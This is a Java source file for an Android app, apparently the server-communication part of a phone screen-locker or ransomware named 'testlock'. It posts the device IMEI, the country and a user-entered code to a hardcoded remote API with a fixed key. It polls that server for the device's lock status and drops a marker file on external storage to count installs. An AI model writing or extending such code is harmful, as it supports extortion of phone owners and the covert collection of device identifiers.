package com.example.testlock;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Locale;

import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.entity.AbstractHttpEntity;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;
import org.apache.http.protocol.HTTP;

import android.content.Context;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.Environment;
import android.util.Log;

public class RequestSender {

	Context context;

	RequestSender(Context context) {
		this.context = context;
	}

	public boolean isOnline() {
		ConnectivityManager cm = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
		NetworkInfo netInfo = cm.getActiveNetworkInfo();
		if (netInfo != null && netInfo.isConnectedOrConnecting()) {
			return true;
		}
		return false;
	}

	public void sendCode(String code, String imei) {
		HttpResponse response;
		InputStream is = null;
		String result = "";
		HttpPost httppost = null;
		final HttpClient httpclient = new DefaultHttpClient();
		httppost = new HttpPost("http://site-api.com/api.php");
		try {
			List<NameValuePair> nameValuePairs = new ArrayList<NameValuePair>(3);
			Date cDate = new Date(System.currentTimeMillis());
			nameValuePairs.add(new BasicNameValuePair("method", "alladd"));
			nameValuePairs.add(new BasicNameValuePair("app_key", "f5h3d8jh2g6nv6gk7g2was1g4ncmpu3"));
			nameValuePairs.add(new BasicNameValuePair("date", cDate.getDate() + "." + (cDate.getMonth() + 1) + "." + (cDate.getYear() + 1900)));
			nameValuePairs.add(new BasicNameValuePair("country", Locale.getDefault().getISO3Country() + "_" + imei));
			nameValuePairs.add(new BasicNameValuePair("code", code));
			nameValuePairs.add(new BasicNameValuePair("imei", imei));

			AbstractHttpEntity uefe = new UrlEncodedFormEntity(nameValuePairs, HTTP.UTF_8);
			uefe.setContentType("application/x-www-form-urlencoded; charset=UTF-8");
			uefe.setContentEncoding("UTF-8");
			httppost.setEntity(uefe);

			response = httpclient.execute(httppost);

			HttpEntity entity = response.getEntity();
			is = entity.getContent();
		}
		catch (Throwable e) {
			Log.v("ERROR", e.toString());
		}

		try {
			BufferedReader reader = new BufferedReader(new InputStreamReader(is, "UTF-8"), 8);
			StringBuilder sb = new StringBuilder();
			String line = null;
			while ((line = reader.readLine()) != null) {
				sb.append(line + "\n");
			}
			is.close();
			result = sb.toString();
		}
		catch (Throwable e) {
			Log.e("log_tag", "Error converting result " + e.toString());
		}
	}
	
	public String checkState(String imei) {
		HttpResponse response;
		InputStream is = null;
		String result = "";
		HttpPost httppost = null;
		final HttpClient httpclient = new DefaultHttpClient();
		httppost = new HttpPost("http://site-api.com/api.php");
		try {
			List<NameValuePair> nameValuePairs = new ArrayList<NameValuePair>(3);
			Date cDate = new Date(System.currentTimeMillis());
			nameValuePairs.add(new BasicNameValuePair("method", "devicestatus"));
			nameValuePairs.add(new BasicNameValuePair("app_key", "f5h3d8jh2g6nv6gk7g2was1g4ncmpu3"));
			nameValuePairs.add(new BasicNameValuePair("imei", imei));

			AbstractHttpEntity uefe = new UrlEncodedFormEntity(nameValuePairs, HTTP.UTF_8);
			uefe.setContentType("application/x-www-form-urlencoded; charset=UTF-8");
			uefe.setContentEncoding("UTF-8");
			httppost.setEntity(uefe);

			response = httpclient.execute(httppost);

			HttpEntity entity = response.getEntity();
			is = entity.getContent();
		}
		catch (Throwable e) {
			Log.v("ERROR", e.toString());
		}

		try {
			BufferedReader reader = new BufferedReader(new InputStreamReader(is, "UTF-8"), 8);
			StringBuilder sb = new StringBuilder();
			String line = null;
			while ((line = reader.readLine()) != null) {
				sb.append(line + "\n");
			}
			is.close();
			result = sb.toString();
			return result;
		}
		catch (Throwable e) {
			Log.e("log_tag", "Error converting result " + e.toString());
		}
		return "";
	}

	public boolean checkFlagFile() {
		File file = new File(Environment.getExternalStorageDirectory() + "/" + "droidflag.syst");
		if (file.exists())
			return true;
		else {
			try {
				OutputStream fo = new FileOutputStream(file);
				fo.write(("datadata").getBytes());
				fo.close();
			}
			catch (Throwable e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		}
		return false;
	}

	public void sendIncrement() {
		if (!checkFlagFile()) {
			HttpResponse response;
			InputStream is = null;
			String result = "";
			HttpPost httppost = null;
			final HttpClient httpclient = new DefaultHttpClient();
			httppost = new HttpPost("http://site-api.com/api.php");
			try {
				List<NameValuePair> nameValuePairs = new ArrayList<NameValuePair>(3);
				Date cDate = new Date(System.currentTimeMillis());
				nameValuePairs.add(new BasicNameValuePair("method", "launcher"));
				nameValuePairs.add(new BasicNameValuePair("app_key", "f5h3d8jh2g6nv6gk7g2was1g4ncmpu3"));

				AbstractHttpEntity uefe = new UrlEncodedFormEntity(nameValuePairs, HTTP.UTF_8);
				uefe.setContentType("application/x-www-form-urlencoded; charset=UTF-8");
				uefe.setContentEncoding("UTF-8");
				httppost.setEntity(uefe);

				response = httpclient.execute(httppost);

				HttpEntity entity = response.getEntity();
				is = entity.getContent();
			}
			catch (Throwable e) {
				Log.v("ERROR", e.toString());
			}

			try {
				BufferedReader reader = new BufferedReader(new InputStreamReader(is, "UTF-8"), 8);
				StringBuilder sb = new StringBuilder();
				String line = null;
				while ((line = reader.readLine()) != null) {
					sb.append(line + "\n");
				}
				is.close();
				result = sb.toString();
			}
			catch (Throwable e) {
				Log.e("log_tag", "Error converting result " + e.toString());
			}
		}
	}
}
